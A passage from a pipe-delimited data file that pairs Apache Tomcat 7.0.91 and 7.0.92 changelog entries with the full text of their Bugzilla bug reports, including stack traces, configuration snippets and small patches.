	org.apache.jasper.compiler.Compiler.compile(Compiler.java:350)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:334)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:595)
	org.apache.jasper.servlet.JspServletWrapper.loadTagFile(JspServletWrapper.java:262)
	org.apache.jasper.compiler.TagFileProcessor.loadTagFile(TagFileProcessor.java:585)
	org.apache.jasper.compiler.TagFileProcessor.access$000(TagFileProcessor.java:48)
	org.apache.jasper.compiler.TagFileProcessor$TagFileLoaderVisitor.visit(TagFileProcessor.java:668)
	org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1544)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2441)
	org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2447)
	org.apache.jasper.compiler.Node$Root.accept(Node.java:470)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2389)
	org.apache.jasper.compiler.TagFileProcessor.loadTagFiles(TagFileProcessor.java:691)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:232)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:350)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:334)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:595)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:382)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:386)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:330)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:742)
	<omiting spring framework stack>
Note The full stack trace of the root cause is available in the server logs.

Apache Tomcat/8.5.34

As said the culprit is Generator.TagHandlerInfo's tagHandlerClass, but why ? :)

I am unable to reproduce the problem with Tomcat 8.5.24, maybe related to changes done in https://bz.apache.org/bugzilla/show_bug.cgi?id=62603 ?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62757
Jasper|Tomcat 7.0.92 (violetagg)|fix|62808|Fix a regression in the TLD whitespace parsing fix that broke parsing when new lines were present in the method signature. (markt)|"""function-signature"" text containing line breaks causes JasperException"|"When a function was defined in tld file with function-signature containing line breaks causes JasperException in Tomcat v7.0.91.

For example
```
  <function>
    <name>getSomething</name>
    <function-class>com.example.Functions</function-class>
    <function-signature>
      com.example getSomething(com.example.longpackagename.Foo,
            com.example.longpackagename.Bar,
            com.example.longpackagename.Baz)
    </function-signature>
  </function>
```

This function definition works well in Tomcat v7.0.85 But not work in Tomcat v7.0.91.
In Tomcat v7.0.91, this definition causes JasperException like bellow.

```
Oct 09, 2018 11:22:04 AM org.apache.catalina.core.ApplicationDispatcher invoke
SEVERE: Servlet.service() for servlet jsp threw exception
org.apache.jasper.JasperException: Invalid syntax for function signature in TLD.  Tag Library: xxx, Function: getSomething
	at org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:56)
	at org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:445)
	at org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:165)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.getMethod(Validator.java:1648)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.processSignature(Validator.java:1635)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.access$400(Validator.java:420)
	at org.apache.jasper.compiler.Validator$ValidateVisitor$1FVVisitor.visit(Validator.java:1611)
	at org.apache.jasper.compiler.ELNode$Function.accept(ELNode.java:139)
...

```

However, according to the specification of JSR 245, ""function-signature"" can contain line breaks (LF or CRLF).
So I think that this behavior violates the specification.
http://download.oracle.com/otn-pub/jcp/jsp-2.1-fr-spec-oth-JSpec/jsp-2_1-fr-spec.pdf


The detail of definition is below.
The spec of ""function-signature"" element was defined in p. 3-32 as follows.
```
            function-signature element is as follows: 
                FunctionSignature ::= ReturnType S MethodName S? 
                                      ‚Äô(‚Äô S? Parameters? S? ‚Äô)‚Äô 
                ReturnType        ::= Type 
                MethodName        ::= Identifier 
                Parameters        ::=   Parameter 
                                      | ( Parameter S? ‚Äô,‚Äô S? Parameters ) 
                Parameter         ::= Type 
```

The ""S"" was defined as follows.
p. 1-27
```
S::= XML::
```

p. 1-16
```
The prefix XML:: is used to refer to an EBNF definition in the XML 1.0 speci-
fication. Refer to http://www.w3.org/TR/REC-xml
```

https://www.w3.org/TR/REC-xml/#NT-S
```
S (white space) consists of one or more space (#x20) characters, carriage returns, line feeds, or tabs.
```



We think that this change is ‚Äã‚Äãthe cause of this problem and I'm afraid that the same change was ‚Äã‚Äãalso done in Tomcat v8.0.x and v9.0.x
ref. http://svn.apache.org/viewvc/tomcat/tc7.0.x/trunk/java/org/apache/jasper/compiler/Validator.java?r1=1840104&r2=1840103&pathrev=1840104"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62808
WebSocket|Tomcat 7.0.92 (violetagg)|fix|62731|Make the URI returned by HandshakeRequest.getRequestURI() and Session.getRequestURI() absolute so that the scheme, host and port are accessible. (markt)|HandshakeRequest has a relative URL|"I opened an issue in CometD about a NPE in their code:

https://github.com/cometd/cometd/issues/791

According to the supporter of CometD, this is actually an issue with Tomcat:

https://github.com/cometd/cometd/issues/791#issuecomment-422322833

He's saying that ""request.getRequestURI()"" should return an absolute URI in order to be able to get the schema as there is no other API for that. Please check the link for his exact words.

I could probably come up with a reproduction project if one is needed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62731
Web applications|Tomcat 7.0.92 (violetagg)|fix|62761|Correct the advanced CORS example in the Filter documentation to use a valid configuration. (markt)|CORS filter example in docs not working in versions since 9.0.9|"for the CORS configuration as specified in the documentation in web.xml

<filter>
  <filter-name>CorsFilter</filter-name>
  <filter-class>org.apache.catalina.filters.CorsFilter</filter-class>
  <init-param>
    <param-name>cors.allowed.origins</param-name>
    <param-value>*</param-value>
  </init-param>
  <init-param>
    <param-name>cors.allowed.methods</param-name>
    <param-value>GET,POST,HEAD,OPTIONS,PUT</param-value>
  </init-param>
  <init-param>
    <param-name>cors.allowed.headers</param-name>
    <param-value>Content-Type,X-Requested-With,accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers</param-value>
  </init-param>
  <init-param>
    <param-name>cors.exposed.headers</param-name>
    <param-value>Access-Control-Allow-Origin,Access-Control-Allow-Credentials</param-value>
  </init-param>
  <init-param>
    <param-name>cors.support.credentials</param-name>
    <param-value>true</param-value>
  </init-param>
  <init-param>
    <param-name>cors.preflight.maxage</param-name>
    <param-value>10</param-value>
  </init-param>
</filter>
<filter-mapping>
  <filter-name>CorsFilter</filter-name>
  <url-pattern>/*</url-pattern>
</filter-mapping>


 i get the following error printed in the log file

26-Sep-2018 14:43:52.535 SEVERE [main] org.apache.catalina.core.StandardContext.filterStart Exception starting filter [CorsFilter]
 javax.servlet.ServletException: It is not allowed to configure supportsCredentials=[true] when allowedOrigins=[*]
	at org.apache.catalina.filters.CorsFilter.parseAndStore(CorsFilter.java:759)
	at org.apache.catalina.filters.CorsFilter.init(CorsFilter.java:183)
	at javax.servlet.GenericFilter.init(GenericFilter.java:61)
	at org.apache.catalina.core.ApplicationFilterConfig.initFilter(ApplicationFilterConfig.java:270)
	at org.apache.catalina.core.ApplicationFilterConfig.getFilter(ApplicationFilterConfig.java:251)
	at org.apache.catalina.core.ApplicationFilterConfig.<init>(ApplicationFilterConfig.java:102)
	at org.apache.catalina.core.StandardContext.filterStart(StandardContext.java:4491)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5135)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:743)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:719)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:703)
	at org.apache.catalina.startup.HostConfig.deployDirectory(HostConfig.java:1141)
	at org.apache.catalina.startup.HostConfig$DeployDirectory.run(HostConfig.java:1876)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
	at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:112)
	at org.apache.catalina.startup.HostConfig.deployDirectories(HostConfig.java:1053)
	at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:428)
	at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1585)
	at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:308)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:123)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:424)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:367)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:969)
	at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:839)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1429)
	at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1419)
	at java.util.concurrent.FutureTask.run(FutureTask.java:266)
	at org.apache.tomcat.util.threads.InlineExecutorService.execute(InlineExecutorService.java:75)
	at java.util.concurrent.AbstractExecutorService.submit(AbstractExecutorService.java:134)
	at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:944)
	at org.apache.catalina.core.StandardEngine.startInternal(StandardEngine.java:261)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
	at org.apache.catalina.core.StandardService.startInternal(StandardService.java:422)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:770)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:183)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:682)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:497)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:350)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:492)


This filter used to work in the tomcat 8.33 version"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62761
Web applications|Tomcat 7.0.92 (violetagg)|fix|62786|Add a note to the Context documentation to explain that, by default, settings for a Context element defined in server.xml will be overwritten by settings specified in a default context file such as conf/context.xml. (markt)|Post Resources ignored in server.xml when Resources tag present in context.xml|"Hello,

We have noticed that when ""Resources"" tag is declared in context.xml, it hides PostResources declaration in a given context in server.xml.
When we copy the same context and put it in a separated file (under [engine]/[host]/[context].xml, everything runs correctly so I guess that this is a bug because we don't have the same behaviour for a given context.
We have reproduced this on all Tomcat 8.0.x and 8.5.x so far."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62786
Web applications|Tomcat 7.0.92 (violetagg)|fix||Create a little visual separation between the Undeploy button and the other buttons in the Manager application. Patch provided by ≈Åukasz JƒÖder. (markt)|||
Other|Tomcat 7.0.92 (violetagg)|update||Update the packaged version of the Tomcat Native Library to 1.2.18 to pick up the latest Windows binaries built with APR 1.6.5 and OpenSSL 1.1.1. (markt)|||
Catalina|Tomcat 7.0.91 (violetagg)|add|61692|Add the ability to control which HTTP methods are handled by the CGI Servlet via a new initialization parameter cgiMethods. (markt)|CGIServlet should handle additional HTTP methods, for example MKCALENDAR, MKCOL, PROPFIND, PROPPATCH|"Created attachment 35474 [details]
Allow additional HTTP methods by configuration

I am working on running Nextcloud (PHP web application) with the Tomcat webserver.
Nextcloud serves different ressources with WebDAV, and that requires additional HTTP methods.

Currently CGIServlet only handles the GET, POST, HEAD (and OPTIONS, TRACE) HTTP methods.

In addition I have had to implement the following HTTP methods: DELETE MKCALENDAR, MKCOL, PROPFIND, PROPPATCH, PUT, REPORT.
Because there are tons of other HTTP methods nowadays, I suggest to make the whole think configurable. See for example https://github.com/nextcloud/server/issues/6644
Alternatively, CGIServlet could just handle any HTTP method (that means just forward the method string to the CGI script, without limiting to a pre configured list).
Attached is a patch, that works fine for me."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61692
Catalina|Tomcat 7.0.91 (violetagg)|fix||Ensure that the HTTP Vary header is set correctly when using the CORS filter and improve the cacheability of requests that pass through the COPRS filter. (markt)|||
Catalina|Tomcat 7.0.91 (violetagg)|fix|62527|Revert restriction of JNDI to the java: namespace. (remm)|Lookupname Validation in ResourceBase|"Hello all,

In the svn commit: r1831256 - java/org/apache/tomcat/util/descripto/web/ResourceBase.java , we have changed the lookupname validation which checks that lookup starts with java:/ namespace. But, as extensively used in Apache TomEE, users have already been using openejb:/ namespace in their lookup names and all working until this commit. Can we do something configurable for this validation check?

Regards.
Gurkan"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62527
Catalina|Tomcat 7.0.91 (violetagg)|add||Introduce a new class - MultiThrowable - to report exceptions when multiple actions are taken where each action may throw an exception but all actions are taken before any errors are reported. Use this new class when reporting multiple container (e.g. web application) failures during start. (markt)|||
Catalina|Tomcat 7.0.91 (violetagg)|fix||Correctly decode URL paths (+ should not be decoded to a space in the path) in the RequestDispatcher and the web application class loader. (markt)|||
Catalina|Tomcat 7.0.91 (violetagg)|add|62559|Add jaxb-*.jar to the list of JARs ignored by StandardJarScanner. (markt)|"Add ""jaxb-*.jar"" to tomcat.util.scan.StandardJarScanFilter.jarsToSkip"|"Unfortunately, Glassfish JAXB JARs contain ""Class-Path"" manifest entries. They shall be excluded to have JAXB RI JARs available once per VM via common loader for all apps."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62559
Catalina|Tomcat 7.0.91 (violetagg)|add|62560|Add oraclepki.jar to the list of JARs ignored by StandardJarScanner. (markt)|"Add ""oraclepki.jar"" to tomcat.util.scan.StandardJarScanFilter.jarsToSkip"|"This JAR is part Oracle Wallet implementation for the JDBC driver.  Unfortunately, it contains a ""Class-Path"" manifest entry which refers to other JARs in ORACLE_HOME. They shall be excluded to have ojdbc.jar as well as Wallet support available once per VM via common loader for all apps."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62560
Catalina|Tomcat 7.0.91 (violetagg)|add|62607|"Return a non-zero exit code from catalina.[bat|sh] run if Tomcat fails to start. (markt)"|Catalina exits with status code 0 when the configuration is invalid|"With a malformed server.xml file, ""catalina.sh confitest"" reports the error and exits with the status code 1. But with ""catalina.sh run"" the status code is 0 (SUCCESS). This confuses daemon management systems like systemd which might not report the error properly, or attempt to restart the server repeatedly.

Here is a suggested fix:

--- a/java/org/apache/catalina/startup/Bootstrap.java
+++ b/java/org/apache/catalina/startup/Bootstrap.java
@@ -489,6 +489,10 @@
             } else if (command.equals(""start"")) {
                 daemon.setAwait(true);
                 daemon.load(args);
+                if (null == daemon.getServer()) {
+                    log.fatal(""Cannot start server. Server instance is not configured."");
+                    System.exit(1);
+                }
                 daemon.start();
             } else if (command.equals(""stop"")) {
                 daemon.stopServer(args);"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62607
Catalina|Tomcat 7.0.91 (violetagg)|code||Remove ServletException from declaration of Tomcat.addWebapp(String,String) since it is never thrown. Patch provided by Tzafrir. (markt)|||
Catalina|Tomcat 7.0.91 (violetagg)|fix||Use short circuit logic to prevent potential NPE in CorsFilter. (fschumacher)|||
Catalina|Tomcat 7.0.91 (violetagg)|code||Simplify construction of appName from container name in JAASRealm. (fschumacher)|||
Catalina|Tomcat 7.0.91 (violetagg)|fix||Improve the handling of path parameters when working with RequestDispatcher objects. (markt)|||
Catalina|Tomcat 7.0.91 (violetagg)|fix|62664|Process requests with content type multipart/form-data to servlets with a @MultipartConfig annotation regardless of HTTP method. (markt)|@MultipartConfig, getParts(), and getParameter() on PUT requests|"Created attachment 36123 [details]
HttpServlet subclass which will echo parameters for POST and for PUT before and after calling getParts()

This is about a servlet annotated with @MultipartConfig.

For POST requests, ""parts with form-data as the Content-Disposition but without a filename"" are available to getParameter*.

For PUT requests, such parts are not initially available to getParameter*.  If I call getParameter* before getParts(), they are never available to getParameter*, even after calling getParts().  If I call getParts() first, then they are available to getParameter*.

The servlet spec does not appear to require that PUT and POST should behave differently for multipart requests in servlets annotated with @MultipartConfig.  Even if it did, it seems very surprising that the call order of getParts() vs getParameter* would affect which parameters were available.

Tried on Tomcat 9.0.11 (and also some earlier versions), with Oracle Java 8."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62664
Catalina|Tomcat 7.0.91 (violetagg)|fix|62669|When using the SSIFilter and a resource does not specify a content type, do not force the content type to application/x-octet-stream. (markt)|ResponseIncludeWrapper.getContentType() never returns NULL and sets the field|"Hello,

according to the documentation org.apache.catalina.ssi.ResponseIncludeWrapper.getContentType() should return NULL if the content type is not known. However a fallback to ""application/x-octet-stream"" is implemented and it actually sets the content type field of the object.

I had a quick look into the SVN repository and it seems this code was introduced in or before 2006. Because this was 12 years ago and because I could not find any report regarding this issue, I guess everyone else can work with that and only the documentation needs to be adapted.

However I actually prefer to get NULL. First of all for me it is bad practice to set a value in a getter (if it is not called ""lazy...""). But let me try to explain the real problem.

The control flow of SSIFilter is:
* ...
* Wrap the actual response with ResponseIncludeWrapper
* Continue and complete the filter chain
* Check the content type
* ...

The problem is when the filter chain is continued and completed, other filters that get the content type from the response (ResponseIncludeWrapper) actually change the content type of the response even though this is most likely NOT what the other filters want to do. It happens by accident, just by calling getContentType.

Also some filters rely on the fact that the getContentType returns NULL if it is not known, in order to check if they should set it on their own. They never set the content type because with the current implementation it always return a value other than NULL.

Best regards,
Sven."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62669
Catalina|Tomcat 7.0.91 (violetagg)|fix||When generating a redirect to a directory in the Default Servlet, avoid generating a protocol relative redirect. (markt)|||
Coyote|Tomcat 7.0.91 (violetagg)|fix||Refactor code that adds an additional header name to the Vary HTTP response header to use a common utility method that addresses several additional edge cases. (markt)|||
Coyote|Tomcat 7.0.91 (violetagg)|fix|62526|Correctly handle PKCS12 format key stores when the key store password is configured to be the empty string. Note that Java 6 does not support PKCS12 key stores configured to use a store password of the empty string. (markt)|Tomcat fails in a strange way when PKCS12 key store password is the empty string|"I defined a keystore with no password and a password for the key.

I then run the following code:

    SSLHostConfig shc = new SSLHostConfig();
    shc.setProtocols(""TLSv1.2"");
    shc.setCertificateKeystoreFile(""file:testenv/conf/keystore.p12"");
    shc.setCertificateKeystorePassword("""");
    shc.setCertificateKeystoreType(""PKCS12"");
    shc.setCertificateKeyPassword(""azerty"");
    shc.setHostName(""_default_"");
    NioEndpoint v = new NioEndpoint();
    v.setSSLEnabled(true);
    v.addSslHostConfig(shc);
    v.bind();

I'm getting this stack:
java.lang.IllegalArgumentException: Private key must be accompanied by certificate chain
	at org.apache.tomcat.util.net.AbstractJsseEndpoint.createSSLContext(AbstractJsse
...
Caused by: java.lang.IllegalArgumentException: Private key must be accompanied by certificate chain
	at java.security.KeyStore.setKeyEntry(KeyStore.java:1136)
	at org.apache.tomcat.util.net.jsse.JSSEUtil.getKeyManagers(JSSEUtil.java:257)
	at 

If a define a password for both or the password is defined only for the keystore, it works. If keystore without password is not allowed, a better message should be provided."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62526
Coyote|Tomcat 7.0.91 (violetagg)|fix|62670|Adjust the memory leak protection for the DriverManager so that JDBC drivers located in $CATALINA_HOME/lib and $CATALINA_BASE/lib are loaded via the service loader mechanism when the protection is enabled. (markt)|driverManagerProtection in JreMemoryLeakPreventionListener results in java.sql.SQLException: No suitable driver found|"Created attachment 36128 [details]
index.jsp file - can be dropped in any example webapps

Tomcat shows ""java.sql.SQLException: No suitable driver found for jdbc:postgresql://localhost:5432/postgres ..."" (applies to other drivers too) when the driver class is not explicitly loaded using Class.forName(""..."")

The DriverManager (https://docs.oracle.com/javase/8/docs/api/java/sql/DriverManager.html) spec states that this is not required (The jdbc4+ drivers use service loaders to register themselves)

This seems to be because of driverManagerProtection in JreMemoryLeakPreventionListener. When this flag is set to 'false' in conf/server.xml, the database connection works as expected. 

The bug was observed when postgresql-42.2.2.jar was placed in CATALINA_HOME/lib or in CATALINA_HOME/webapps/examples/WEB-INF/lib/"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62670
Coyote|Tomcat 7.0.91 (violetagg)|fix|62685|Correct an error in host name validation parsing that did not allow a fully qualified domain name to terminate with a period. Patch provided by AG. (markt)|Changes to hostname parsing in HttpParser breaks hostname with trailing dot|"Following fix ""Enable strict validation of the provided host name and port for all connectors. Requests with invalid host names and/or ports will be rejected with a 400 response. (markt) "" is now restricting the use of trailing dot in hostname.

As per RFC 1034 and information on this site http://www.dns-sd.org/trailingdotsindomainnames.html trailing dot is perfectly valid for a hostname.


The fix is very simple and if needed I can contribute to the fix as well.
Please suggest."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62685
Jasper|Tomcat 7.0.91 (violetagg)|fix|53011|When pre-compiling with JspC, report all compilation errors rather than stopping after the first error. A new option -failFast can be used to restore the previous behaviour of stopping after the first error. Based on a patch provided by Marc Pompl. (markt)|Ant Jasper task fails after one error|"The Ant task for Jasper JSP compiling (JspC) will fail (if failOnError = true) after a single error, without looking for other errors.

This can be very challenging for large projects. For example, we have 2,487 JSPs that need compiling. If some part of the Java code is changed that breaks hundreds of JSPs (which, admittedly, means a developer didn't do his job correctly, but still), the continuous integration build for our project fails (as it should), but the log only shows one of the errors.

The Ant task should have a new property, ""failAfterAllErrors,"" that makes it log all compile failures as errors but continue compiling until every JSP compilation has been attempted.

This is similar to how the javac Ant task works. It logs ALL of the compile errors, and only after having tried to compile everything, it fails the build.

Thoughts?

I am interested in possibly contributing code for this feature. I will email the developers' list later about it."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53011
Jasper|Tomcat 7.0.91 (violetagg)|add|53492|Make the Java file generation process multi-threaded. By default, one thread will be used per core. Based on a patch by Dan Fabulich. (markt)|Make JspC shell multithreaded|"Created attachment 29016 [details]
patch

Jasper works great multi-threaded. Using two threads per core substantially improves throughput on my test machine, reducing the time it takes to build from 9 minutes to 2 minutes.

The attached patch adds a new -threadCount command-line argument to JspC, as well as a setThreadCount setter, suitable for use in an Ant task. It accepts a positive integer, or a core factor like ""2.0C"" which means two threads per core. 2.0C is the default.

Note that on my machine it didn't help that much unless JspC was also configured to -compile the classes.

I've attached a patch."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53492
Jasper|Tomcat 7.0.91 (violetagg)|fix|62603|Fix a potential race condition when development mode is disabled and background compilation checks are enabled. It was possible that some updates would not take effect and/or ClassNotFoundExceptions would occur. (markt)|Changes in tag files are not reflected in the rendered view or they end up with a java.lang.NoClassDefFoundError|"We have an application that contains jsps and tag files, when we deploy jsp/tag changes instead of reloading the webapp entirely we change those in the webapps folder, and let jsp reloading process do the work for us. 

From time to time, we suffer from two different kind of errors:

1- java.lang.NoClassDefFoundError because the tag file used in a jsp is ""not found"", but the jsp and also the tag file are there (TOMCA_HOME/work/Catalina/localhost/ROOT/org/apache/jsp/...)

2- changes in a tag file are never reflected in the rendered view(jsp)


I've took some time to debug the jsp reloading code, and here are my thoughts

Jsp reloading process at the end is calling JspServlet.periodicEvent method which triggers the process by calling JspRuntimeContext's checkUnload and checkCompile methods

JspRuntimeContext's jsps attribute is the one that contains jsps and tag references that are going to be checked from time to time, depending on checkInterval and development config values, to see if a JSP page (and its dependent files) need to be recompiled.

JspRuntimeContext's jsps attribute is backed by a ConcurrentHashMap, so the insertion order MAY NOT be preserved when we iterate through the list of jsps and dependant files. Check JspRuntimeContext.checkCompile() method.

The order in which we iterate through the tags and jsps is relevant because when a change in a tag file is detected the .java and also .class files are generated and its JspServletWrapper.reload attribute is set to true, afterwards in the same JspRuntimeContext.checkCompile() loop, when the process detects that a jsp needs to be recompiled because is ""dependant"" on this tag file  TagFileProcessor.loadTagFile method will invoke the JspServletWrapper.loadTagFile method that belongs to the modified tag, and because its reload attribute was set to true JSpServletWrapper's tagHandler attribute will be loaded again. After this process the .java and .class file that belong to that jsp will be generated 

But what would happen if we :
- detect a change in the jsp first and generate the .java and .class files (jsp needs to be recompiled because of a change in one dependant tag). 
- receive a request that match that jsp which will set JspServletWrapper.reload attribute(set to true in the previous step) to false while still ""pointing"" to the old tag class
- detect the change in the tag file which will recreate .java and .class files

Then, depending on the order of the incoming request and the jsp detection process :
- tag changes are not reflected in the rendered view
- or even worse java.lang.NoClassDefFoundError

Sorry for this long description but it's not easy to explain :)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62603
Jasper|Tomcat 7.0.91 (violetagg)|fix||Correct the JSP version in the X-PoweredBy HTTP header generated when the xpoweredBy option is enabled. (markt)|||
Jasper|Tomcat 7.0.91 (violetagg)|fix|62662|Fix the corruption of web.xml output during JSP compilation caused by the fix for 53492. Patch provided by Bernhard Frauendienst. (markt)|Multithreaded JSP compilation generates invalid web.xml|"The multi-threaded JSP compilation introduced in 8.5.33 with Bug 53492 can create race conditions that lead to invalid web.xml (fragments) to be generated. 

Since access of output streams in `generateWebMapping` is not thread-safe, this can cause mappings to be interleaved, like in this (real-life) example:


>    <servlet-mapping>
>        <servlet-name>org.apache.jsp.WEB_002dINF.jsp.admin.seoKeywordsCmsTable_jsp
>    <servlet-mapping>
>        <servlet-name></servlet-name>
>        <url-pattern>org.apache.jsp.WEB_002dINF.jsp.admin.seo.seokeywordtable_jsp</servlet-name>
>        <url-pattern>/WEB-INF/jsp/admin/seo/seoKeywordsCmsTable.jsp/WEB-INF/jsp/admin/seo/seokeywordtable.jsp</url-pattern>
>    </servlet-mapping>
></url-pattern>
>    </servlet-mapping>

Obviously, this causes an error on startup."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62662
Jasper|Tomcat 7.0.91 (violetagg)|fix||Correct parsing of XML whitespace in TLD function signatures that incorrectly only looked for the space character. (markt)|||
WebSocket|Tomcat 7.0.91 (violetagg)|fix|62596|Remove the limit on the size of the initial HTTP upgrade request used to establish the web socket connection. (markt)|WsWebSocketContainer#connectToServer throws BufferOverflowException|"Created attachment 36071 [details]
Contrived example to trigger BufferOverflowException in WsWebSocketContainer#connectToServer

WsWebSocketContainer#connectToServer throws BufferOverflowException when headers supplied by ClientEndpointConfig.Configurator#beforeRequest are too large.

Exception in thread ""main"" java.nio.BufferOverflowException
	at java.nio.HeapByteBuffer.put(HeapByteBuffer.java:189)
	at java.nio.ByteBuffer.put(ByteBuffer.java:859)
	at org.apache.tomcat.websocket.WsWebSocketContainer.addHeader(WsWebSocketContainer.java:755)
	at org.apache.tomcat.websocket.WsWebSocketContainer.createRequest(WsWebSocketContainer.java:736)
	at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServerRecursive(WsWebSocketContainer.java:275)
	at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:195)

In our application, we are forwarding an Authorization header/token of close to 4000 bytes, which when combined with other headers results in a request larger than the 4096 allocated to the ByteBuffer in WsWebSocketContainer#createRequest.

Suggest making this buffer size configurable via a new setting in org.apache.tomcat.websocket.Constants.  I can contribute a fix if that is appropriate.  Our local patch has the following in Constants:

    static final int WS_UPGRADE_REQUEST_SIZE = Integer.getInteger(
            ""org.apache.tomcat.websocket.WS_UPGRADE_REQUEST_SIZE"", 8 * 1024)
            .intValue();

So, a new default buffer size of 8k, and the option of setting a system property if it needs to be bumped up further.

I've attached some code that will trigger the exception."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62596
Web applications|Tomcat 7.0.91 (violetagg)|add|62558|Add Russian translations for the Manager and Host Manager web applications. Based on a patch by Ivan Krasnov. (markt)|Tomcat Russian localization|"Created attachment 36045 [details]
Russian Localisation

Hello,

I would like to suggest a patch with Russian localization (see attachment).

It contains changes for the build system and translation of a few pages.

If it's checked in, I am going to provide more translations.

I've noted that start page (index.jsp) is not localized - is it expected behavior? What is the correct way to have it localized in my project?

To change the language you need to update  /tomcat9/bin/catalina.sh file in the following way:

add this

if [ -z ""$LOGGING_MANAGER"" ]; then 
JAVA_OPTS=""$JAVA_OPTS -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Duser.language=ru -Duser.region=RU""
else 
JAVA_OPTS=""$JAVA_OPTS $LOGGING_MANAGER -Duser.language=ru -Duser.region=RU""
fi"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62558
Web applications|Tomcat 7.0.91 (violetagg)|add|62561|Add advanced class loader configuration information regarding the use of the Server and Shared class loaders to the documentation web application. (markt)|class-loader-howto.html does not mention server.loader and shared.loader from catalina.properties|"Just stumbled upon this in our custom config that upto Tomcat 9 server.loader and shared.loader are still loaded by Bootstrap class, but those are not documented in the aforementioned documenation file.

To avoid confusion for the user both class loaders should be documented or mentioned that they are obsolete."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62561
Web applications|Tomcat 7.0.91 (violetagg)|add||Expand the information in the documentation web application regarding the use of CATALINA_HOME and CATALINA_BASE. Patch provided by Marek Czernek. (markt)|||
Web applications|Tomcat 7.0.91 (violetagg)|fix|62652|Make it clearer that the version of DBCP that is packaged in Tomcat 7.0.x is DBCP 1. (markt)|DBCP documentation to fix/clarify|"First of all, for none experts, trying to figure out how to set consistently a DB connection into a context file, has become difficult.

We have DBCP 1, DBCP 2... Tomcat implements its own implementation and there's no spot clearly specifying what to choose or set...  
Resource factory attribute is not enough mentioned but it's a corner stone.
